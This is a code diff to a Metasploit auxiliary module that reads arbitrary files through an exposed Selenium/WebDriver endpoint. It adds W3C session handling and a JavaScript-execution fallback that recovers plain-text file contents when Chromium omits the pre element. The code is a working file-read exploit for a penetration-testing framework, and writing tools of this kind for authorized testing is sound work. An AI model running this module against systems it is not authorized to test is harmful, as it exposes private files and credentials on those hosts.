@@ -122,8 +122,8 @@ class MetasploitModule < Msf::Auxiliary
       })
     }, datastore['TIMEOUT'])
     document = webdriver_document(res, 'Failed to start browser session')
-    session_id = document['value']['sessionId'] if document['value'].is_a?(Hash)
-    session_id ||= document['sessionId']
+    w3c_session_id = document['value']['sessionId'] if document['value'].is_a?(Hash)
+    session_id = w3c_session_id || document['sessionId']
     unless session_id.is_a?(String) && session_id.present?
       fail_with(Failure::UnexpectedReply, 'Failed to start browser session: WebDriver did not return a session ID')
     end
@@ -149,18 +149,50 @@ class MetasploitModule < Msf::Auxiliary
         fail_with(Failure::UnexpectedReply, "Failed to read file #{datastore['FILEPATH']}: WebDriver did not return page source")
       end
 
-      file_content = Nokogiri::HTML(document['value']).at('pre')
-      unless file_content
-        fail_with(Failure::UnexpectedReply, "Failed to read file #{datastore['FILEPATH']}: Browser did not return a text file")
-      end
-
-      print_good("#{datastore['FILEPATH']}\n#{file_content.text}")
+      execute_command = w3c_session_id ? 'execute/sync' : 'execute'
+      file_content = browser_file_content(document['value'], session_id, execute_command)
+      print_good("#{datastore['FILEPATH']}\n#{file_content}")
     ensure
       delete_browser_session(session_id)
     end
   end
 
   private
+
+  def browser_file_content(page_source, session_id, execute_command)
+    file_content = Nokogiri::HTML(page_source).at('pre')
+    return file_content.text if file_content
+
+    # Chromium can omit pre for an empty text file. Verify the actual document
+    # rather than treating every blank HTML or initial data/about page as a file.
+    operation = "Failed to read file #{datastore['FILEPATH']}"
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH, session_id, 'url')
+    })
+    current_url = webdriver_document(res, operation)['value']
+    scheme = datastore['SCHEME'].to_s.downcase
+    allowed_schemes = %w[http https].include?(scheme) ? %w[http: https:] : ["#{scheme}:"]
+    unless current_url.is_a?(String) && current_url.start_with?(*allowed_schemes)
+      fail_with(Failure::UnexpectedReply, "#{operation}: Browser did not navigate to the requested resource scheme")
+    end
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, WEBDRIVER_SESSION_PATH, session_id, execute_command),
+      'ctype' => 'application/json; charset=utf-8',
+      'data' => JSON.generate({
+        script: 'return {body_text: document.body ? document.body.textContent : null, content_type: document.contentType, href: document.URL};',
+        args: []
+      })
+    })
+    state = webdriver_document(res, operation)['value']
+    unless state.is_a?(Hash) && state['content_type'] == 'text/plain' && state['href'] == current_url && state['body_text'].is_a?(String)
+      fail_with(Failure::UnexpectedReply, "#{operation}: Browser did not return a plain text document")
+    end
+
+    state['body_text']
+  end
 
   def webdriver_document(response, operation)
     document = response.get_json_document if response&.code == 200
